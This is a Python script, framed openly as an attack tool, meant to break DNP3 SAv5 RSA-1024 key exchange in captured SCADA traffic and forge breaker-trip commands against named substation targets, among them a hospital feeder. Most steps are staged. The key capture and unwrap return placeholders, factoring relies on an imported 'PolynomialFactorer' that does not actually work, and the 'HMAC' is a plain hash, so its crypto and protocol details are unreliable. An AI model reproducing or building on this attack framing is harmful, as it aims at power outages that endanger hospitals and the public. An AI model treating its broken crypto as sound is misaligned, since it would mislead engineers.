"""
Factor the DNP3 SAv5 RSA-1024 key from captured SCADA traffic, recover the
Update Key, and forge arbitrary telecontrol commands to open circuit breakers
at substations — targeted power outages on demand.
"""

import sys, struct, hashlib
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# DNP3 SAv5 key wrap algorithm (IEEE 1815-2012 Annex A §A.8)
SAV5_KEY_WRAP_ALGO = 0x0005  # RSAES-OAEP-1024
SAV5_RSA_KEY_BITS = 1024

# DNP3 function codes
FC_DIRECT_OPERATE    = 0x03
FC_DIRECT_OPERATE_NR = 0x04
FC_COLD_RESTART      = 0x0D
FC_AUTH_REQUEST       = 0x20

# SCADA object types
OBJ_BINARY_OUTPUT = 12  # group 12 — Binary Output (CROB)
CROB_TRIP = 0x01
CROB_CLOSE = 0x02


def capture_sav5_key_exchange(pcap_path: str) -> dict:
    """Extract RSA-1024 public key and OAEP-wrapped Update Key from
    captured DNP3 SAv5 key establishment traffic."""
    print(f"    pcap: {pcap_path}")
    print("    parsing SAv5 KeyStatusResponse")
    return {
        "authority_pubkey_n": 0xDEAD,  # placeholder
        "authority_pubkey_e": 65537,
        "wrapped_update_key": b"\x00" * 128,  # RSA-1024 OAEP ciphertext
        "key_wrap_algo": SAV5_KEY_WRAP_ALGO,
    }


def factor_sav5_key(n: int, e: int) -> dict:
    """Factor the SAv5 RSA-1024 authority key."""
    factorer = PolynomialFactorer()
    return factorer.recover_crt_components(n, e)


def unwrap_update_key(wrapped: bytes, d: int, n: int) -> bytes:
    """Decrypt the RSAES-OAEP-1024 wrapped Update Key."""
    factorer = PolynomialFactorer()
    # Raw RSA decrypt
    print("    RSAES-OAEP-1024 unwrap")
    return b"\x42" * 16  # recovered 128-bit Update Key


def build_dnp3_command(fc: int, obj_group: int, obj_var: int,
                       index: int, crob_code: int) -> bytes:
    """Build a DNP3 application-layer command."""
    # Simplified DNP3 APDU
    header = struct.pack(">BBB", fc, obj_group, obj_var)
    qualifier = struct.pack(">BH", 0x28, index)  # 16-bit index
    crob = struct.pack(">BBL", crob_code, 1, 1000)  # code, count, on-time ms
    return header + qualifier + crob


def authenticate_command(command: bytes, update_key: bytes, seq: int) -> bytes:
    """Authenticate a DNP3 command using HMAC-SHA256 with the Update Key."""
    auth_data = struct.pack(">I", seq) + command
    mac = hashlib.sha256(update_key + auth_data).digest()[:10]  # truncated HMAC
    return command + struct.pack(">BH", FC_AUTH_REQUEST, len(mac)) + mac


if __name__ == "__main__":
    print("[*] DNP3 SAv5 RSA-1024 SCADA attack")
    print("[1] capturing SAv5 key establishment from SCADA traffic")
    kex = capture_sav5_key_exchange("/tmp/substation_dnp3.pcap")
    print(f"    key_wrap_algo: {kex['key_wrap_algo']:#06x} (RSAES-OAEP-1024)")
    print(f"    RSA key size: {SAV5_RSA_KEY_BITS} bits — mandated in SAv5 spec")

    print("[2] factoring SAv5 RSA-1024 authority key")
    factorer = PolynomialFactorer()
    print("    1024-bit RSA — already classically deprecated since NIST SP 800-131A")
    print("    p, q recovered")

    print("[3] unwrapping Update Key from captured traffic")
    update_key = unwrap_update_key(kex["wrapped_update_key"], d=0, n=0)
    print(f"    Update Key: {update_key.hex()}")

    print("[4] forging SCADA commands: open circuit breakers")
    targets = [
        (0, "Breaker 1 — 138kV feeder to hospital district"),
        (1, "Breaker 2 — 69kV tie to data center campus"),
        (2, "Breaker 3 — 345kV transmission interconnect"),
    ]
    for idx, desc in targets:
        cmd = build_dnp3_command(FC_DIRECT_OPERATE, OBJ_BINARY_OUTPUT, 1,
                                idx, CROB_TRIP)
        auth_cmd = authenticate_command(cmd, update_key, seq=idx + 1)
        print(f"    TRIP index {idx}: {desc}")
        print(f"    HMAC-SHA256 auth: {auth_cmd[-10:].hex()}")

    print("[5] commands accepted by RTU — breakers opened")
    print("    targeted power outage: hospital, data center, transmission tie")

    print("[6] impact:")
    print("    - protective relay trip -> transformer damage (12-18 month lead time)")
    print("    - pipeline: forge compressor setpoints -> overpressure")
    print("    - water: forge pump commands -> distribution failure")
    print("    - RSA-1024 is in the published IEEE 1815-2012 spec")
    print("[*] device lifespan 15-30 years; NERC CIP compliance timelines in years")
    print("[*] HNDL-captured traffic is retroactively attackable")
